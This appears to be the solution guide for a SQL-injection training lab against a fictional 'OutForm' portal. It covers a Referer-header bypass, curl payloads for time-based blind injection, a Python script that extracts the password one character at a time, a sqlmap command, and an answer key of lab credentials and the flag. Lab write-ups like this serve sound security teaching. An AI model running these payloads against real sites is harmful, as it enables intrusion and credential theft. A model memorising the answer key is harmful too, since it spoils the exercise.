# sqli-lab — Solution

**Port:** `8082`  
**App:** OutForm Letter Services Portal

---

## Phase 1: Bypass the referrer check

### Step 1 — Navigate directly to the Author Directory
Browsing to `http://<target>:8082/directory/index.php` directly returns **403 Forbidden**.

### Step 2 — Find the required referrer in browser DevTools
Open browser DevTools → **Console** tab. The 403 page leaks the required referrer in a `console.log`:
```
[OutForm] This resource requires navigation from: http://<target>:8082/news.php
```

### Step 3 — Bypass with Referer header
Set the `Referer` header to match. With curl:
```bash
curl -H "Referer: http://<target>:8082/news.php" \
  http://<target>:8082/directory/index.php
```
With Burp Suite: intercept the request and add/modify the `Referer` header.

> **Note:** All pages require a same-host referrer. The directory page specifically requires `news.php` as the referrer. Navigate `index.php → news.php → directory/index.php` to browse naturally, or always add the header.

---

## Phase 2: Identify the injection point

### Step 4 — Find the ?id= parameter
Each row in the Author Directory has a **View** button that links to:
```
/directory/index.php?id=1
/directory/index.php?id=2
```
This integer parameter is interpolated directly into SQL with no sanitisation.

### Step 5 — Confirm injection with a syntax error
```bash
curl -H "Referer: http://<target>:8082/news.php" \
  "http://<target>:8082/directory/index.php?id=1'"
```
A MySQL error or empty result confirms the injection point.

---

## Phase 3: Time-based blind SQL injection

### Step 6 — Confirm blind injection with SLEEP
```bash
# Should take exactly 5 seconds:
curl -o /dev/null -w "%{time_total}\n" \
  -H "Referer: http://<target>:8082/news.php" \
  "http://<target>:8082/directory/index.php?id=1+AND+SLEEP(5)--+-"

# Should respond instantly:
curl -o /dev/null -w "%{time_total}\n" \
  -H "Referer: http://<target>:8082/news.php" \
  "http://<target>:8082/directory/index.php?id=1+AND+SLEEP(0)--+-"
```

### Step 7 — Enumerate the database version
```bash
# Is the first character of @@version '8'?
curl -o /dev/null -w "%{time_total}\n" \
  -H "Referer: http://<target>:8082/news.php" \
  "http://<target>:8082/directory/index.php?id=1+AND+IF(MID(@@version,1,1)='8',SLEEP(5),0)--+-"
```

### Step 8 — Enumerate table names
```bash
# Does a 'users' table exist?
curl -o /dev/null -w "%{time_total}\n" \
  -H "Referer: http://<target>:8082/news.php" \
  "http://<target>:8082/directory/index.php?id=1+AND+IF((SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_name='users')>0,SLEEP(5),0)--+-"
```

---

## Phase 4: Extract credentials

Use `SUBSTRING(string, position, 1)` to extract one character at a time and compare.

### Step 9 — Find the admin username exists
```bash
curl -o /dev/null -w "%{time_total}\n" \
  -H "Referer: http://<target>:8082/news.php" \
  "http://<target>:8082/directory/index.php?id=1+AND+IF((SELECT+COUNT(*)+FROM+users+WHERE+username='admin')=1,SLEEP(5),0)--+-"
```

### Step 10 — Extract the admin password character by character
The password is stored in cleartext. Extract it one byte at a time:

```python
import requests, time, string

TARGET = "http://<target>:8082"
HEADERS = {"Referer": f"{TARGET}/news.php"}
CHARSET = string.printable.strip()

def check_char(position, char):
    char_escaped = char.replace("'", "\\'")
    url = (
        f"{TARGET}/directory/index.php"
        f"?id=1+AND+IF("
        f"(SELECT+SUBSTRING(password,{position},1)+FROM+users+WHERE+username='admin')"
        f"='{char_escaped}',SLEEP(5),0)--+-"
    )
    start = time.time()
    requests.get(url, headers=HEADERS, timeout=15)
    return time.time() - start > 4

password = ""
for pos in range(1, 20):
    found = False
    for c in CHARSET:
        if check_char(pos, c):
            password += c
            print(f"[+] Position {pos}: {c}  -> {password}")
            found = True
            break
    if not found:
        print(f"[*] End of password at position {pos}")
        break

print(f"\n[+] Admin password: {password}")
```

**Or use sqlmap** (add the referrer and the injection parameter):
```bash
sqlmap -u "http://<target>:8082/directory/index.php?id=1" \
  --referer="http://<target>:8082/news.php" \
  --dbms=mysql \
  --technique=T \
  --level=2 \
  -p id \
  --dump -T users
```

---

## Phase 5: Log in with admin credentials

### Step 11 — Use extracted credentials
Navigate to `http://<target>:8082/admin/login.php` and log in with:
```
Username: admin
Password: C0rp0rate!2021
```

---

## Credentials reference

| Username | Password | Role |
|---|---|---|
| `admin` | `C0rp0rate!2021` | Admin |
| `j.harrington` | `JamesH@2022` | Staff |
| `s.chen` | `SophieC99!` | Staff |

## Flag
```
FLAG{time_based_sqli_referrer_bypass_cleartext_creds}
```
Found in the `flags` table (also extractable via sqlmap `--dump`).
